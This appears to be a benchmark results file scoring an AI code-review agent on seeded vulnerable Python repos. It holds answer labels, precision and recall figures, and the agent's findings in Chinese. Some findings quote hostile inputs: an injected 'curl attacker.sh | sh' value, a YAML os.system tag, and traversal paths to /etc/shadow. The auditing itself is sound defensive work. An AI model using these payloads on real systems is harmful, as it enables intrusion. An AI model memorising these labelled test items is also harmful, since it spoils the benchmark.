@@ -1,0 +1,1670 @@
+{
+  "model": "deepseek-flash",
+  "repeats": 1,
+  "tolerances": [
+    0,
+    1,
+    2,
+    3,
+    4,
+    6,
+    8
+  ],
+  "results": [
+    {
+      "sample": "s1-obvious-danger",
+      "tier": "L1 基础",
+      "style": "标准口径",
+      "goal": "审查这个仓库中的缺陷，重点是会导致错误行为、资源泄漏或安全问题的实现。逐文件检查，确认后记录发现。",
+      "audit_root": "examples\\s1-obvious-danger\\repo",
+      "labels": [
+        {
+          "code": "SEC013-a",
+          "file": "app/hooks.py",
+          "line": 6,
+          "description": "exec 在任意输入上执行"
+        },
+        {
+          "code": "SEC010-a",
+          "file": "app/settings.py",
+          "line": 5,
+          "description": "生产凭据硬编码在源码里"
+        },
+        {
+          "code": "SEC010-b",
+          "file": "app/settings.py",
+          "line": 6,
+          "description": "数据库口令同样硬编码"
+        },
+        {
+          "code": "SEC011-a",
+          "file": "app/settings.py",
+          "line": 14,
+          "description": "外部输入拼进 shell 命令，可注入"
+        },
+        {
+          "code": "SEC012-a",
+          "file": "app/settings.py",
+          "line": 19,
+          "description": "eval 执行任意表达式"
+        }
+      ],
+      "rule": {
+        "findings": 3,
+        "recall": 0.6,
+        "precision": 1.0,
+        "f1": 0.75,
+        "found": [
+          "SEC013-a@ app/hooks.py:6",
+          "SEC010-b@ app/settings.py:6",
+          "SEC012-a@ app/settings.py:19"
+        ]
+      },
+      "runs": [
+        {
+          "run": 1,
+          "elapsed": 26.9,
+          "iterations": 5,
+          "stop_reason": "finished",
+          "summary": "审计范围：工作区 `.` 下经 list_files（递归、上限 2000）确认仅有 2 个文件——`app/hooks.py`（14 行）与 `app/settings.py`（19 行），两者均已整文件读完；并用 grep 对 `exec(|eval(|shell=True|subprocess|DEPLOY_KEY|DB_PASSWORD` 全仓检索，未发现其他调用点或配置层缓解措施（无沙箱封装、无凭据读取辅助函数、无输入校验）。因此可以判定这两个文件即全部审计面。\n\n共记录 4 条 blocker：\n1. `app/settings.py:5-6` 生产凭据（DEPLOY_KEY、DB_PASSWORD）以明文硬编码。\n2. `app/settings.py:13-14` 字符串拼接 + `shell=True` 调用 tar，target 未校验，存在命令注入（且含空格路径会被拆参导致错误行为）。\n3. `app/settings.py:19` 对来自运维配置的表达式直接 `eval`，无受限 globals，可执行任意代码。\n4. `app/hooks.py:6` 对用户提供的钩子代码直接 `exec(code, namespace)`，无隔离/白名单/异常处理，可在宿主进程权限下执行任意代码，并可能通过传入的 namespace 篡改宿主全局名字。\n\n未发现但值得说明",
+          "warnings": [
+            "任务列表仍有 2 项未完成，但总结里没有提到未覆盖的部分"
+          ],
+          "usage": {
+            "prompt": 30770,
+            "completion": 4204,
+            "cached": 25088
+          },
+          "cache_hit": 0.815,
+          "findings": [
+            {
+              "file": "app/settings.py",
+              "line": 5,
+              "severity": "blocker",
+              "title": "生产凭据以明文形式硬编码在源码中",
+              "detail": "DEPLOY_KEY 与 DB_PASSWORD 两个生产环境密钥以字符串字面量直接写在模块顶层（第 5、6 行）。任何能读到该文件的人（代码仓库访问者、CI 日志、打包产物、pip 分发包）都能直接获得部署密钥与数据库口令，且轮换必须改代码并重新发布。文件在导入时即完成常量绑定，说明这不是占位/示例常量而是被直接使用的值。",
+              "evidence": "app/settings.py:5 `DEPLOY_KEY = \"prod_live_7f3a9c2e4b8d1f6a24c5\"`；app/settings.py:6 `DB_PASSWORD = \"pg_prod_9x2kQ7mZ\"`。变量名前缀 prod_ 表明是生产凭据。"
+            },
+            {
+              "file": "app/settings.py",
+              "line": 13,
+              "severity": "blocker",
+              "title": "shell=True 拼接 target 造成命令注入",
+              "detail": "run_backup 把调用方传入的 target 直接字符串拼接进 shell 命令，并以 shell=True 交给 /bin/sh 解释。target 若含 shell 元字符（例如 `\"/tmp; curl attacker.sh | sh #\"` 或 `\"$(id)\"`、反引号），注入的命令会以进程权限执行；即使 target 来自「运维配置」而非终端，配置本身也可能是低信任输入。另外 target 未做空白/路径校验，带空格的目录会被拆成多个参数导致行为错误。",
+              "evidence": "app/settings.py:13 `cmd = \"tar -czf /backup/snapshot.tgz \" + target`；app/settings.py:14 `return subprocess.check_output(cmd, shell=True).decode()`"
+            },
+            {
+              "file": "app/settings.py",
+              "line": 19,
+              "severity": "blocker",
+              "title": "对配置表达式调用 eval，可执行任意代码",
+              "detail": "expand_rule 直接 eval(expression)。该参数是运维配置里的表达式字符串，一旦表达式来源不可信（配置文件、API 参数、环境变量），即可执行任意 Python 代码（如 `__import__(\"os\").system(...)`），等同于进程内代码执行。eval 没有传入受限 globals/locals，被测表达式可访问内建函数。",
+              "evidence": "app/settings.py:17-19 `def expand_rule(expression: str) -> object: ... return eval(expression)`，文档串说明输入来自「运维配置里的表达式」。"
+            },
+            {
+              "file": "app/hooks.py",
+              "line": 6,
+              "severity": "blocker",
+              "title": "插件钩子对用户代码直接 exec，无任何隔离",
+              "detail": "apply_hook 把「用户提供的钩子代码」原样 exec 到传入的 namespace 中。exec 与调用进程同权限运行，钩子代码可读写文件、发起网络请求、读取环境变量中的密钥、篡改宿主状态；namespace 由调用方传入，若为宿主模块的 globals 则钩子还能覆盖宿主名字（如替换 render_hint、改写全局配置）。函数签名与文档均未声明任何沙箱、白名单或超时，也没有捕获异常，钩子抛错会直接向上冒泡打断调用方。",
+              "evidence": "app/hooks.py:4-7 `def apply_hook(code: str, namespace: dict) -> dict: \"\"\"执行一段用户提供的钩子代码。\"\"\" exec(code, namespace) return namespace`"
+            }
+          ],
+          "matched": 4,
+          "missed": [
+            "SEC010-b app/settings.py:6"
+          ],
+          "missed_detail": [
+            {
+              "code": "SEC010-b",
+              "file": "app/settings.py",
+              "line": 6,
+              "description": "数据库口令同样硬编码",
+              "nearest_prediction": {
+                "file": "app/settings.py",
+                "line": 5,
+                "severity": "blocker",
+                "title": "生产凭据以明文形式硬编码在源码中",
+                "detail": "DEPLOY_KEY 与 DB_PASSWORD 两个生产环境密钥以字符串字面量直接写在模块顶层（第 5、6 行）。任何能读到该文件的人（代码仓库访问者、CI 日志、打包产物、pip 分发包）都能直接获得部署密钥与数据库口令，且轮换必须改代码并重新发布。文件在导入时即完成常量绑定，说明这不是占位/示例常量而是被直接使用的值。",
+                "evidence": "app/settings.py:5 `DEPLOY_KEY = \"prod_live_7f3a9c2e4b8d1f6a24c5\"`；app/settings.py:6 `DB_PASSWORD = \"pg_prod_9x2kQ7mZ\"`。变量名前缀 prod_ 表明是生产凭据。"
+              },
+              "distance": 1
+            }
+          ],
+          "spurious": [],
+          "spurious_detail": [],
+          "duplicates": [],
+          "precision": 1.0,
+          "recall": 0.8,
+          "f1": 0.889,
+          "tolerance_curve": {
+            "0": {
+              "precision": 0.75,
+              "recall": 0.6,
+              "f1": 0.667,
+              "spurious": 1,
+              "missed": 2,
+              "duplicates": 0
+            },
+            "1": {
+              "precision": 1.0,
+              "recall": 0.8,
+              "f1": 0.889,
+              "spurious": 0,
+              "missed": 1,
+              "duplicates": 0
+            },
+            "2": {
+              "precision": 1.0,
+              "recall": 0.8,
+              "f1": 0.889,
+              "spurious": 0,
+              "missed": 1,
+              "duplicates": 0
+            },
+            "3": {
+              "precision": 1.0,
+              "recall": 0.8,
+              "f1": 0.889,
+              "spurious": 0,
+              "missed": 1,
+              "duplicates": 0
+            },
+            "4": {
+              "precision": 1.0,
+              "recall": 0.8,
+              "f1": 0.889,
+              "spurious": 0,
+              "missed": 1,
+              "duplicates": 0
+            },
+            "6": {
+              "precision": 1.0,
+              "recall": 0.8,
+              "f1": 0.889,
+              "spurious": 0,
+              "missed": 1,
+              "duplicates": 0
+            },
+            "8": {
+              "precision": 1.0,
+              "recall": 0.8,
+              "f1": 0.889,
+              "spurious": 0,
+              "missed": 1,
+              "duplicates": 0
+            }
+          }
+        }
+      ]
+    },
+    {
+      "sample": "s2-resources-errors",
+      "tier": "L2 基础",
+      "style": "标准口径",
+      "goal": "审查这个仓库中的缺陷，重点是会导致错误行为、资源泄漏或安全问题的实现。逐文件检查，确认后记录发现。",
+      "audit_root": "examples\\s2-resources-errors\\repo",
+      "labels": [
+        {
+          "code": "RES010-a",
+          "file": "app/exporter.py",
+          "line": 11,
+          "description": "句柄未用 with，写入过程中抛异常则永不关闭"
+        },
+        {
+          "code": "ERR010-a",
+          "file": "app/exporter.py",
+          "line": 23,
+          "description": "裸 except 连 KeyboardInterrupt 一起吞掉"
+        },
+        {
+          "code": "ERR011-a",
+          "file": "app/exporter.py",
+          "line": 33,
+          "description": "异常被静默吞掉，调用方拿到 0 以为真的没数据"
+        },
+        {
+          "code": "RES011-a",
+          "file": "app/pool.py",
+          "line": 25,
+          "description": "提前 return 跳过下面的 release，连接被漏掉"
+        }
+      ],
+      "rule": {
+        "findings": 4,
+        "recall": 0.75,
+        "precision": 0.75,
+        "f1": 0.75,
+        "found": [
+          "RES010-a@ app/exporter.py:11",
+          "ERR010-a@ app/exporter.py:23",
+          "ERR011-a@ app/exporter.py:34"
+        ]
+      },
+      "runs": [
+        {
+          "run": 1,
+          "elapsed": 51.2,
+          "iterations": 7,
+          "stop_reason": "finished",
+          "summary": "审计范围：工作区只有 2 个文件（app/exporter.py 35 行、app/pool.py 27 行），已逐行完整读完；`git diff HEAD~1 -- app` 无差异，说明这两个文件不是本次改动引入的，因此按「逐文件检查现有实现」处理。用 grep 确认这些函数在本仓库内没有其他引用（`export_csv|fetch_config|purge_cache|Pool(|acquire|release|compute` 仅命中定义与 pool.py 内部调用），排除了「调用方已有兜底」的可能。\n\n共记录 5 条发现：\n\n1. blocker — app/pool.py:24 `compute()` 在 `hits > 100` 时提前 return，跳过唯一会执行 `in_use -= 1` 的 `pool.release(conn)`（L26）。泄漏出函数作用域后无法被任何调用方归还，`in_use` 只增不减，且声明的 `size` 从未参与容量判断，属于不可恢复的计数泄漏。\n\n2. warn — app/exporter.py:11 `open()` 未配 `with`/`try-finally`，L13-14 循环写入抛错时 L15 的 `close()` 不可达。\n\n3. warn — app/exporter.py:14 CSV 字段裸拼接、未用 csv",
+          "warnings": [],
+          "usage": {
+            "prompt": 44711,
+            "completion": 7809,
+            "cached": 38528
+          },
+          "cache_hit": 0.862,
+          "findings": [
+            {
+              "file": "app/pool.py",
+              "line": 24,
+              "severity": "blocker",
+              "title": "compute() 提前 return 时不归还连接，in_use 只增不减",
+              "detail": "compute() 在第 22 行 acquire 后把计数加一，但第 24-25 行 `if hits > 100: return hits` 直接返回，跳过了第 26 行的 release(conn)。因此每次命中数超过 100 的调用都会永久泄漏一个连接，self.in_use 单调增长且永不复位。调用方无法弥补：泄漏的引用只在函数内部持有，函数返回后没有任何句柄能归还它，所以这是不可恢复的泄漏。任何依赖 in_use/size 做容量判断的逻辑（size 字段已声明但未被使用）会随着 hit>100 的调用累积而失效。触发条件很明确：只要有一次 key 使 count 返回值大于 100。",
+              "evidence": "L22 `conn = pool.acquire()` → L10 `self.in_use += 1`；L24 `if hits > 100:` L25 `return hits`（无 release）；L26 `pool.release(conn)` 是唯一会执行 `self.in_use -= 1` 的地方，在提前返回路径上不可达。"
+            },
+            {
+              "file": "app/exporter.py",
+              "line": 11,
+              "severity": "warn",
+              "title": "export_csv 未用 with/try-finally，写入失败时文件句柄不被关闭",
+              "detail": "第 11 行 open 之后，第 13-14 行的循环写入一旦抛异常（例如 row 不是 dict 而 raise AttributeError/TypeError，或磁盘写满、编码错误），第 15 行的 handle.close() 不会执行。CPython 虽会在对象被垃圾回收时关闭文件并给出 ResourceWarning，但关闭时机不确定，在被回收前句柄一直占用；写入不完整时也不会保证缓冲区内容落盘、更不会清理半截文件。触发条件：rows 中任意一行不是字典或 name 值不可 str 化时（如 None 之外的异常对象），以及底层 I/O 报错。",
+              "evidence": "L11 `handle = open(path, \"w\", encoding=\"utf-8\")`；L13-14 在 try 之外循环 `row[\"id\"]` / `row[\"name\"]`；L15 `handle.close()` 在任何一次循环抛错后都不可达。"
+            },
+            {
+              "file": "app/exporter.py",
+              "line": 14,
+              "severity": "warn",
+              "title": "CSV 字段未转义：值含逗号/引号/换行会写坏报表，含 = 开头则会触发公式注入",
+              "detail": "字段直接用字符串拼接，没有走 csv 模块的转义规则。触发条件：name（或 id）中出现逗号时，该行会被多解析出一列，列错位；出现双引号或换行时，行的边界被破坏，整个报表的后续记录都会解析错乱。此外若值以 =、+、-、@ 开头，被 Excel/Sheets 打开时会被当作公式执行（CSV 公式注入），而 rows 通常来自外部数据，这构成安全问题。",
+              "evidence": "L12 `handle.write(\"id,name\\n\")` 后 L14 `handle.write(str(row[\"id\"]) + \",\" + str(row[\"name\"]) + \"\\n\")`；文件头 L1-6 只有 logging / sqlite3 两个 import，全文无 csv 模块、无任何转义处理。"
+            },
+            {
+              "file": "app/exporter.py",
+              "line": 23,
+              "severity": "note",
+              "title": "fetch_config 用裸 except 把「键不存在」和「读取失败」混为一谈",
+              "detail": "键不存在时 fetchone() 返回 None，取下标会抛 TypeError；数据库不可用/表结构异常时会抛 sqlite3.Error。两者都被 L23 的裸 except 吞掉，统一返回 {}，调用方无法区分「没有这条配置」和「配置读不出来」，可能在读不到凭据/开关的情况下静默走默认分支。裸 except 还会一并捕获 KeyboardInterrupt / SystemExit 等 BaseException。",
+              "evidence": "L22 `return {\"value\": cursor.fetchone()[0]}`；L23 `except:`（裸 except）；对比同文件 L33 的 `except Exception:`。"
+            },
+            {
+              "file": "app/exporter.py",
+              "line": 34,
+              "severity": "note",
+              "title": "purge_cache 把清理失败上报为「删除 0 条」",
+              "detail": "DELETE 或 commit 失败（锁冲突、磁盘只读、数据库损坏）时异常被吞掉，函数返回 0。返回值语义是「删除条数」，因此 0 既可表示「确实没有过期缓存」，也可表示「清理彻底失败」。若调用方按返回值记录/告警，缓存清理长期失效不会被发现，缓存表会持续膨胀。",
+              "evidence": "L30 `cursor = conn.execute(\"DELETE FROM cache WHERE expires_at < datetime('now')\")`；L31 `conn.commit()`；L32 `return cursor.rowcount` 均在 try 内；L33-34 `except Exception: pass`，L35 `return 0`。"
+            }
+          ],
+          "matched": 4,
+          "missed": [],
+          "missed_detail": [],
+          "spurious": [
+            {
+              "file": "app/exporter.py",
+              "line": 14,
+              "severity": "warn",
+              "title": "CSV 字段未转义：值含逗号/引号/换行会写坏报表，含 = 开头则会触发公式注入",
+              "detail": "字段直接用字符串拼接，没有走 csv 模块的转义规则。触发条件：name（或 id）中出现逗号时，该行会被多解析出一列，列错位；出现双引号或换行时，行的边界被破坏，整个报表的后续记录都会解析错乱。此外若值以 =、+、-、@ 开头，被 Excel/Sheets 打开时会被当作公式执行（CSV 公式注入），而 rows 通常来自外部数据，这构成安全问题。",
+              "evidence": "L12 `handle.write(\"id,name\\n\")` 后 L14 `handle.write(str(row[\"id\"]) + \",\" + str(row[\"name\"]) + \"\\n\")`；文件头 L1-6 只有 logging / sqlite3 两个 import，全文无 csv 模块、无任何转义处理。"
+            }
+          ],
+          "spurious_detail": [
+            {
+              "probe": {
+                "file": "app/exporter.py",
+                "line": 14,
+                "severity": "warn",
+                "title": "CSV 字段未转义：值含逗号/引号/换行会写坏报表，含 = 开头则会触发公式注入",
+                "detail": "字段直接用字符串拼接，没有走 csv 模块的转义规则。触发条件：name（或 id）中出现逗号时，该行会被多解析出一列，列错位；出现双引号或换行时，行的边界被破坏，整个报表的后续记录都会解析错乱。此外若值以 =、+、-、@ 开头，被 Excel/Sheets 打开时会被当作公式执行（CSV 公式注入），而 rows 通常来自外部数据，这构成安全问题。",
+                "evidence": "L12 `handle.write(\"id,name\\n\")` 后 L14 `handle.write(str(row[\"id\"]) + \",\" + str(row[\"name\"]) + \"\\n\")`；文件头 L1-6 只有 logging / sqlite3 两个 import，全文无 csv 模块、无任何转义处理。"
+              },
+              "nearest_label": {
+                "code": "RES010-a",
+                "file": "app/exporter.py",
+                "line": 11
+              },
+              "distance": 3,
+              "in_same_file": true
+            }
+          ],
+          "duplicates": [],
+          "precision": 0.8,
+          "recall": 1.0,
+          "f1": 0.889,
+          "tolerance_curve": {
+            "0": {
+              "precision": 0.4,
+              "recall": 0.5,
+              "f1": 0.444,
+              "spurious": 3,
+              "missed": 2,
+              "duplicates": 0
+            },
+            "1": {
+              "precision": 0.8,
+              "recall": 1.0,
+              "f1": 0.889,
+              "spurious": 1,
+              "missed": 0,
+              "duplicates": 0
+            },
+            "2": {
+              "precision": 0.8,
+              "recall": 1.0,
+              "f1": 0.889,
+              "spurious": 1,
+              "missed": 0,
+              "duplicates": 0
+            },
+            "3": {
+              "precision": 1.0,
+              "recall": 1.0,
+              "f1": 1.0,
+              "spurious": 0,
+              "missed": 0,
+              "duplicates": 1
+            },
+            "4": {
+              "precision": 1.0,
+              "recall": 1.0,
+              "f1": 1.0,
+              "spurious": 0,
+              "missed": 0,
+              "duplicates": 1
+            },
+            "6": {
+              "precision": 1.0,
+              "recall": 1.0,
+              "f1": 1.0,
+              "spurious": 0,
+              "missed": 0,
+              "duplicates": 1
+            },
+            "8": {
+              "precision": 1.0,
+              "recall": 1.0,
+              "f1": 1.0,
+              "spurious": 0,
+              "missed": 0,
+              "duplicates": 1
+            }
+          }
+        }
+      ]
+    },
+    {
+      "sample": "s3-input-paths",
+      "tier": "L3 进阶",
+      "style": "完整背景（给出关注方向）",
+      "goal": "审查这个仓库。用户可控的数据在进入文件系统、反序列化和外部请求之前，有没有做必要的校验与限制？请逐条给出结论。",
+      "audit_root": "examples\\s3-input-paths\\repo",
+      "labels": [
+        {
+          "code": "PATH01-a",
+          "file": "app/files.py",
+          "line": 13,
+          "description": "name 未做基线校验，../ 可越出 BASE_DIR"
+        },
+        {
+          "code": "DESER01-a",
+          "file": "app/files.py",
+          "line": 20,
+          "description": "pickle 处理不可信数据等同任意代码执行"
+        },
+        {
+          "code": "DESER02-a",
+          "file": "app/files.py",
+          "line": 25,
+          "description": "yaml.load 未指定 SafeLoader，可构造对象"
+        },
+        {
+          "code": "SSRF01-a",
+          "file": "app/files.py",
+          "line": 30,
+          "description": "未限制目标地址，可打内网与云元数据服务"
+        }
+      ],
+      "rule": {
+        "findings": 0,
+        "recall": 0.0,
+        "precision": 0.0,
+        "f1": 0.0,
+        "found": []
+      },
+      "runs": [
+        {
+          "run": 1,
+          "elapsed": 56.0,
+          "iterations": 8,
+          "stop_reason": "finished",
+          "summary": "## 审计范围\n\n工作区只有一个文件 `app/files.py`（31 行，`list_files` 确认），其中四个函数构成四个「用户可控数据 → 危险汇聚点」的入口。仓库内**没有**任何调用点、依赖声明（requirements/pyproject）、测试或配置，因此每条结论都是针对该函数契约（docstring 明确写明输入来自用户）的判定，实际可达性取决于上层调用方——这一点我在每条发现里都如实标了。\n\n## 逐条结论（对应「文件系统 / 反序列化 / 外部请求 / 数据解析」四项检查）\n\n| # | 入口 | 校验现状 | 级别 |\n|---|---|---|---|\n| 1 | `read_upload(name)` L13-14 → 文件系统 | 无 | blocker |\n| 2 | `load_profile(blob)` L20 → 反序列化 | 无 | blocker |\n| 3 | `fetch_avatar(url)` L30-31 → 外部请求 | 无 | blocker |\n| 4 | `load_settings(text)` L25 → YAML 反序列化 | 无（依赖默认 Loader） | warn |\n\n1. **`read_upload`（app/files.py:13）**——`os.path.join(BASE_DIR, name)",
+          "warnings": [
+            "运行中发生 3 次工具失败：\n- read_symbols: FileNotFound - [Errno 13] Permission denied: 'C:\\\\Users\\\\34442\\\\Desktop\\\\porject\\\\代码审查agent\\\\backend\\\\examples\\\\s3-input-paths\\\\repo'\n- run_command: HighRiskBlocked - `r",
+            "有 2 次工具调用被护栏拒绝。"
+          ],
+          "usage": {
+            "prompt": 83786,
+            "completion": 8680,
+            "cached": 67072
+          },
+          "cache_hit": 0.801,
+          "findings": [
+            {
+              "file": "app/files.py",
+              "line": 13,
+              "severity": "blocker",
+              "title": "read_upload 直接把文件名拼进路径，未做规范化与越界校验，可读任意文件",
+              "detail": "name 完全来自调用方（docstring 写明「按文件名读取上传目录里的文件」），代码对其不做任何校验：既没有拒绝绝对路径、没有剔除 `..`，也没有用 realpath/commonpath 确认结果仍位于 BASE_DIR 之下，随后 L14 直接 open()。两条可利用路径：(1) 当 name 以 `/` 开头（如 `/etc/passwd`）时，os.path.join 的语义是丢弃前面的 BASE_DIR，返回绝对路径本身，等于绕开上传目录；(2) 当 name 形如 `../../etc/shadow` 时，拼接结果虽以 BASE_DIR 开头，但未被规范化，open 时由内核解析 `..` 逃逸出目录（BASE_DIR 为 /srv/uploads，向上三级即到根）。触发不需要任何特殊时序，只要该函数被请求处理路径调用即可读取进程可读的任意文件（含应用自身配置文件、凭",
+              "evidence": "app/files.py:13-14 `target = os.path.join(BASE_DIR, name)` / `with open(target, encoding=\"utf-8\") as handle:`；L8 `BASE_DIR = \"/srv/uploads\"`，函数体内无 normpath / realpath / startswith 校验。os.path.join 在遇到绝对路径分量时会丢弃前面的参数，这是 Python 标准库的既有语义（未能用 run_command 复现，工具被高危权限拦截）。"
+            },
+            {
+              "file": "app/files.py",
+              "line": 20,
+              "severity": "blocker",
+              "title": "load_profile 对用户提交的字节流直接 pickle.loads，构成反序列化 RCE",
+              "detail": "blob 是「用户提交的会话快照」，属于完全外部可控的字节流，而 pickle.loads 会在反序列化过程中执行 payload 里指定的任意可调用对象与构造器（如 `!!python` 风格的 `__reduce__` 返回值，或 `os.system` / `subprocess` 一类的 callable），无需任何前置条件即可在服务进程权限下执行任意代码。这是不可逆危害（getshell / 读取进程内所有密钥），且触发不需要异常输入之外的任何条件。",
+              "evidence": "app/files.py:18-20 函数签名为 `load_profile(blob: bytes) -> dict`，docstring「反序列化用户提交的会话快照」，L20 函数体只有 `return pickle.loads(blob)`，无 imghdr/魔术字节校验、无签名验证、无受限 Unpickler。"
+            },
+            {
+              "file": "app/files.py",
+              "line": 30,
+              "severity": "blocker",
+              "title": "fetch_avatar 用用户给定的 URL 直接发外部请求，无协议/主机白名单，可被用作 SSRF",
+              "detail": "url 由用户提供（docstring「按用户给出的地址抓取头像」），代码未做任何限制：没有校验 scheme（ftp/gopher/file 等非 http 协议同样会被 requests 接受）、没有主机名/IP 黑名单或白名单、没有解析后 IP 是否属于内网网段的判断。requests 默认 allow_redirects=True，即使上游加了域名白名单也能被 302 跳转绕过。由于 L31 把响应体原样返回给调用方，这不是盲 SSRF：攻击者能直接读到内网服务的响应，典型目标是云元数据服务（169.254.169.254 的凭据接口）与 localhost 上的管理端口，从而窃取云凭证或探测内网拓扑。附带问题：response.content 会把响应体一次性读入内存且没有大小上限，配合一个返回超大响应或慢速持续发送的地址即可造成内存/连接占用。已做的唯一限制是 timeout=",
+              "evidence": "app/files.py:28-31 `def fetch_avatar(url: str) -> bytes:` / `response = requests.get(url, timeout=5)` / `return response.content`；函数内无 URL 解析、无 ipaddress 内网判断、无 allow_redirects=False、无 stream=True/大小限制。"
+            },
+            {
+              "file": "app/files.py",
+              "line": 25,
+              "severity": "warn",
+              "title": "load_settings 用 yaml.load 且未指定 Loader，解析外部 YAML 依赖不安全的默认加载器",
+              "detail": "text 是「用户上传的 YAML 配置」，属于外部输入，而 yaml.load 在此处没有传 Loader 参数，安全性完全取决于安装的 PyYAML 版本：PyYAML < 5.1 时未指定 Loader 会退回完整的不安全 Loader，`!!python/object/apply:os.system` 之类的标签可直接执行命令；5.1~5.3.1 的默认 FullLoader 也可被 CVE-2020-14343 一类 payload 绕过；即便在已修复的版本上，标准库也会发出「default Loader is unsafe」的 YAMLLoadWarning。也就是说，这段代码要么存在真实的 RCE，要么至少依赖一个官方明确标注为不安全的默认值，属于不该保留的写法。因为仓库内没有任何依赖声明文件（只有 app/files.py 一个文件），无法确认实际安装版本，所以按「需特定版",
+              "evidence": "app/files.py:23-25 函数签名 `load_settings(text: str) -> dict`，docstring「解析用户上传的 YAML 配置」，L25 为 `return yaml.load(text)`——缺省 Loader 参数，对比安全写法应为 yaml.safe_load(text) 或 yaml.load(text, Loader=yaml.SafeLoader)。`list_files` 显示仓库共 1 个文件，无 requirements.txt/pyproject.toml，故版本不可验证。"
+            }
+          ],
+          "matched": 4,
+          "missed": [],
+          "missed_detail": [],
+          "spurious": [],
+          "spurious_detail": [],
+          "duplicates": [],
+          "precision": 1.0,
+          "recall": 1.0,
+          "f1": 1.0,
+          "tolerance_curve": {
+            "0": {
+              "precision": 1.0,
+              "recall": 1.0,
+              "f1": 1.0,
+              "spurious": 0,
+              "missed": 0,
+              "duplicates": 0
+            },
+            "1": {
+              "precision": 1.0,
+              "recall": 1.0,
+              "f1": 1.0,
+              "spurious": 0,
+              "missed": 0,
+              "duplicates": 0
+            },
+            "2": {
+              "precision": 1.0,
+              "recall": 1.0,
+              "f1": 1.0,
+              "spurious": 0,
+              "missed": 0,
+              "duplicates": 0
+            },
+            "3": {
+              "precision": 1.0,
+              "recall": 1.0,
+              "f1": 1.0,
+              "spurious": 0,
+              "missed": 0,
+              "duplicates": 0
+            },
+            "4": {
+              "precision": 1.0,
+              "recall": 1.0,
+              "f1": 1.0,
+              "spurious": 0,
+              "missed": 0,
+              "duplicates": 0
+            },
+            "6": {
+              "precision": 1.0,
+              "recall": 1.0,
+              "f1": 1.0,
+              "spurious": 0,
+              "missed": 0,
+              "duplicates": 0
+            },
+            "8": {
+              "precision": 1.0,
+              "recall": 1.0,
+              "f1": 1.0,
+              "spurious": 0,
+              "missed": 0,
+              "duplicates": 0
+            }
+          }
+        }
+      ]
+    },
+    {
+      "sample": "s4-concurrency",
+      "tier": "L4 进阶",
+      "style": "诊断型（先推根因）",
+      "goal": "先说明这些函数在什么样的线程交错顺序下会出错，再逐个确认实际实现是否存在该问题。",
+      "audit_root": "examples\\s4-concurrency\\repo",
+      "labels": [
+        {
+          "code": "CONC01-a",
+          "file": "app/cache.py",
+          "line": 15,
+          "description": "check-then-act 非原子，并发首次调用会建出多个实例"
+        },
+        {
+          "code": "CONC02-a",
+          "file": "app/cache.py",
+          "line": 22,
+          "description": "判断与写入之间是竞态窗口，可能重复建并覆盖"
+        },
+        {
+          "code": "CONC03-a",
+          "file": "app/cache.py",
+          "line": 32,
+          "description": "读 len 与 add 之间无锁，两个线程会拿到同一个槽位"
+        },
+        {
+          "code": "CONC04-a",
+          "file": "app/cache.py",
+          "line": 38,
+          "description": "读-改-写非原子，并发下会丢更新"
+        }
+      ],
+      "rule": {
+        "findings": 0,
+        "recall": 0.0,
+        "precision": 0.0,
+        "f1": 0.0,
+        "found": []
+      },
+      "runs": [
+        {
+          "run": 1,
+          "elapsed": 119.5,
+          "iterations": 10,
+          "stop_reason": "finished",
+          "summary": "审计范围：工作区仅一个文件 app/cache.py（44 行，即本次「并发」样本的审计根），git 工作区在这条路径上没有改动，因此按整份文件审计。全文 44 行已读全，并用 grep 交叉确认了 _lock / _counter / _registry / _instance 的全部出现位置（共 18 处）。\n\n关键结构事实（后续所有结论都由此推出）：文件导入了 threading 并定义了 _lock（L7），但 grep 显示 _lock 只在 L43 的 snapshot() 里被使用一次；registry、counter、singleton 三个共享可变状态的全部读写路径都没有任何同步。\n\n逐函数确认的「线程交错 → 实际实现是否命中」：\n1) get_or_create（L20-24）— blocker。判断 `key not in _registry`（L22）与写入 `_registry[key] = factory()`（L23）非原子，两线程可同时判定为真并各构造一次；factory 重复执行、L24 可能返回两份不同对象、后写者覆盖前值。正常使用（同 key 首次填充）即可触发，故定 blocker。\n2) ConfigCache.instance（L14-17）— warn。L15 判断与 L16 赋值之间无锁，两线程可各得到一个实例，instance()",
+          "warnings": [
+            "有 2 次调用被护栏拒绝，总结里没有说明",
+            "运行中发生 3 次工具失败：\n- read_file: PathEscape - 路径越出工作区：C:\\Users\\34442\\AppData\\Local\\Temp\\margin-harness\\git-diff.txt -> C:\\Users\\34442\\AppData\\Local\\Temp\\margin-harnes\n- run_command: HighRiskBlocked - `run_",
+            "有 2 次工具调用被护栏拒绝。"
+          ],
+          "usage": {
+            "prompt": 127173,
+            "completion": 18766,
+            "cached": 108160
+          },
+          "cache_hit": 0.85,
+          "findings": [
+            {
+              "file": "app/cache.py",
+              "line": 20,
+              "severity": "blocker",
+              "title": "get_or_create 的 check-then-act 无锁，两个线程会各自构建一份值，缓存被后写者覆盖且返回值不一致",
+              "detail": "出错所需的交错：两个线程（或多请求线程）对同一个 key 同时调用 get_or_create。\n1) 线程 A 在 L22 判断 `key not in _registry` 为真（此时 key 尚未写入）；\n2) 线程 B 也在 L22 判断为真 —— 这两步之间没有锁，也没有「占位」写入，A 尚未执行到 L23；\n3) A 执行 L23 `_registry[key] = factory()`，B 也执行 L23 `_registry[key] = factory()`。\n结果：factory 被重复执行两次（若 factory 持有连接/文件句柄/单例资源，等于重复申请，前一份失去引用、永远不会被释放）；L24 两个线程返回的可能是两份不同的对象，即「同一 key 返回不同实例」；注册表里最终只留下后写入的那一份，先返回给 A 的那份成为无人引用的孤儿。这是典型的 check-th",
+              "evidence": "L22-L24：\n  if key not in _registry:\n      _registry[key] = factory()\n  return _registry[key]\n两行之间既无锁也无占位写入；grep 确认 `_lock` 在整个文件中只出现在 L7 定义与 L43 `with _lock:`（snapshot 内），get_or_create 完全不使用它。"
+            },
+            {
+              "file": "app/cache.py",
+              "line": 15,
+              "severity": "warn",
+              "title": "ConfigCache.instance 的无锁惰性单例：两个线程可能各得到一个实例，instance() 不再全局唯一",
